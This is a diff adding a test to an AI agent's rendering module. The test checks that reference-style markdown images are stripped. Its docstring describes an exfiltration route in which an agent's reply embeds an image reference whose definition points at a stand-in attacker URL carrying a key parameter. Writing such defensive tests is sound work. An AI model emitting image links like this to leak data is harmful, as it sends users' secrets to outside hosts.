@@ -146,6 +146,20 @@ def test_links_are_left_alone():
     assert without_images(text) == text
 
 
+def test_a_reference_style_image_is_defused_too():
+    """`![alt][id]` renders as an `<img>` just as `![alt](url)` does.
+
+    The first pass matched only the inline form, so a reply carrying
+    `![a][x]` plus an `[x]: https://attacker/?k=...` definition kept the whole
+    egress route open while the module docstring said it was shut. A docs
+    review caught the gap between the two.
+    """
+    from mcp_agent.rendering import without_images
+
+    assert without_images("![a][ref]") == "[image: a]"
+    assert without_images("![][ref]") == "[image]"
+
+
 def test_every_image_on_a_line_is_defused():
     from mcp_agent.rendering import without_images
 
